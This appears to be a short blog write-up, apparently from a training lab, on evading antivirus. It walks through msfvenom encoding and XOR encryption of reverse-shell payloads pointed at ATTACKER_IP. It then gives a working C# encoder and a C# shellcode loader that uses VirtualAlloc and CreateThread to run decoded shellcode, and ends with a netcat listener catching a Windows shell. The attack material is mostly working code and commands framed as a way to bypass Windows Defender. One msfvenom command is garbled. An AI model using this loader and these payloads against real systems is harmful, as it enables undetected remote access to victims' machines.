---
title: Evading AV
date: 2023-07-08T22:12:14.963Z
tags:
  - writeup
description: A short blog post which touches ways to create payloads which have
  more a chance to evade anti-virus solutions.
---
## AV Detection

Antivirus solutions are able to analyze EXE files based on the information in the PE header and other PE sections.

Below are some interesting ways you can store shellcode in a PE

* Define shellcode as a local variable within the main function - it will be scored in the `.text` PE section
* Define shellcode as a global variable - it will be stored in the `.data` section
* Store shellcode as a raw binary in an icon image and link it within the code - stored in `.rsrc` data section
* Add a custom section to store the shellcode

## Shellcode Encoding - `MSFVenom`

Public tools such as `Metasploit` provide encoding and encryption features. However, AV vendors are aware of the way these tools build their payloads and take measures to detect them. If you try using any feature out of the box, chances are that your payloads will be detected as soon as the file touches the disk.

To generate a simple payload with this method, see below

First list all encoders available to `msfvenom`

```shell
user@machine$ msfvenom --list encoders | grep excellent
	cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```

You can indicate what encoder to use by using the `-e` switch, and define how many times you want to encode it with the `-i` switch

```shell
user@machine$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
...
```

However, if you try and use this payload then the AV will start complaining instantly.

If encoding doesn’t work, you could try in encryption, we would expect encryption to have a higher success rating than encoding.

## Shellcode Encryption - `MSFVenom`

Similarly to encoding, you can list the available encryption algorithms:

```shell
user@machine$ msfvenom --list encrypt
	Name
    ----
    aes256
    base64
    rc4
    xor
```

This example will build an XOR encrypted payload. For this type of algorithm, you need to specify a key, in the example the key is “supersecret”

```shell
user@machine$ msfvenom - windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "supersecret" -o xored-revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: xored-revshell.exe
```

This will also be detected more often than not… sorry to burst your bubble.

The way to overcome these super-smart antivirus solutions is to create your own payload, so you will now learn how to do that.

## Creating a Custom Payload

Antivirus solutions do not know what to do to analyze your payload, notice you don’t have to do anything too complex, as long as it is confusing enough for the AV to analyse (this is not hard, as static analysis generally isn’t too good)

For this example, you will use a simple reverse shell generated by `msfvenom` and use a combination of XOR and Base64 to bypass windows defender.

Generate a reverse shell with `msfvenom` in C# format

```shell
user@machine$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp \
             -f csharp
```

Before building the actual payload, you will create a program that will encode the program how you like, called the encoder. In this case you will be XORing the payload with a custom key first, then encoding it using base64. Below is the C# source code

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Dropper for Decrypting
            string key = "supersecret";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));
        }
    }
}
```

Remember:

* Change the encryption key (if you want…)
* Change the value of the `buf` variable with the shellcode output by `msfvenom`

You can then compile and execute the program with the following commands (windows)

```powershell
C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
  OJNFOBNopoijfvwo8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
```

### Self-decoding Payload

Since you have an encoded payload, you need to adjust your code so that it decodes the shellcode before executing it. To match the encoder, you need to decode everything in the reverse order. Decoding code can be found below:

```csharp

using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

Compile the code using:

```powershell
C:\> csc.exe EncStageless.cs
```

Before running the payload, set up a netcat listener to listen on the port you supplied to metasploit when you generated the payload:

```shell
user@machine$ nc -lvp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```